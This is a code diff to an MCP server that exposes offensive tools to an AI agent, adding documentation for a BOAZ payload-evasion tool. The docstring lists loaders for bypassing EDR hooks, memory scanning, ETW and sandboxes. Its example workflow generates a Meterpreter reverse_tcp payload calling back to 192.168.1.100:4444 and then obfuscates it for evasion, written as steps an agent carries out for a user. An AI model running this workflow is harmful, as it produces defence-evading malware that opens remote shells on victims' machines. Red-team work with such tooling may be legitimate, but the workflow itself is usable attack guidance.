@@ -5456,10 +5456,35 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
         advanced evasion techniques including 77+ process injection loaders, 12 encoding
         schemes, LLVM obfuscation, API unhooking, ETW patching, and anti-emulation.
 
+        CRITICAL WORKFLOW:
+        1. Generate payload with MSFVenom or other tool first
+        2. Copy/move the payload INTO the BOAZ_beta directory: cp payload.exe BOAZ_beta/
+        3. Call this tool with RELATIVE path (e.g., input_file="payload.exe")
+        4. Output will be in BOAZ_beta/output/ directory
+
+        FILE PATH REQUIREMENTS:
+        - Input file MUST be inside BOAZ_beta directory (security requirement)
+        - Use relative paths: "payload.exe" NOT "/full/path/payload.exe"
+        - Output path is relative: "output/evasive.exe" creates BOAZ_beta/output/evasive.exe
+
+        LOADER SELECTION (choose based on evasion needs):
+        - Syscall Loaders (1-11): Bypass EDR userland hooks via direct syscalls
+        - Stealth Loaders (12-28): Advanced memory scan evasion, module stomping
+        - Memory Guard Loaders (29-34): Breakpoint handlers, ROP trampolines
+        - Threadless Loaders (35-40): VT pointer injection, module stomping
+        - VEH/VCH Loaders (41-45): Exception handler-based injection
+        - Userland Loaders (46-77): Standard Windows API injection
+
+        COMPILATION NOTES:
+        - Some advanced loaders may have compilation errors with newer mingw
+        - If compilation fails, BOAZ will report the error
+        - Try different loaders in the same category if one fails
+        - Use boaz_list_loaders(category="stealth") to see options
+
         Args:
-            input_file: Path to input PE executable (relative to BOAZ_PATH)
-            output_file: Path for output executable (relative to BOAZ_PATH)
-            loader: Loader number (1-77). Default: 16 (Classic Userland APIs)
+            input_file: Filename inside BOAZ_beta/ (e.g., "payload.exe" or "subfolder/payload.exe")
+            output_file: Output path relative to BOAZ_beta/ (e.g., "output/evasive.exe")
+            loader: Loader number (1-77). Choose based on evasion needs (see categories above)
             encoding: Encoding scheme (uuid, xor, mac, ipv4, base45, base64, base58, aes, des, chacha, rc4, aes2)
             compiler: Compiler choice (mingw, pluto, akira). Default: mingw
             shellcode_type: Shellcode generator (donut, pe2sh, rc4, amber, shoggoth, augment). Default: donut
@@ -5488,6 +5513,40 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
             icon: Enable icon for output binary
             detect_hooks: Compile check_hook.exe for detecting hooks
             divide: Enable divide and conquer for AES2
+
+        Example Workflow:
+            # Step 1: Ask user what evasion they need
+            # User: "I need to bypass EDR hooks and evade memory scanning"
+
+            # Step 2: List appropriate loaders
+            stealth_loaders = boaz_list_loaders(category="stealth")
+            # Shows loaders 12-28 with stealth techniques
+
+            # Step 3: Generate MSFVenom payload
+            msfvenom_scan(
+                payload="windows/x64/meterpreter/reverse_tcp",
+                lhost="192.168.1.100",
+                lport=4444,
+                output="payload.exe"
+            )
+
+            # Step 4: Copy to BOAZ_beta directory
+            # (You must manually move: cp payload.exe BOAZ_beta/)
+
+            # Step 5: Apply BOAZ evasion with stealth loader
+            result = boaz_generate_payload(
+                input_file="payload.exe",
+                output_file="output/evasive.exe",
+                loader=13,                    # Stealth loader for memory scan evasion
+                encoding="uuid",              # UUID encoding
+                anti_emulation=True,          # Evade sandboxes
+                etw=True,                     # Patch ETW
+                api_unhooking=True,           # Unhook APIs
+                sleep=True                    # Sleep evasion
+            )
+
+            # If compilation fails, try another loader in the same category
+            # Check result['success'] and result['error'] for details
 
         Returns:
             Result with payload generation status and output information
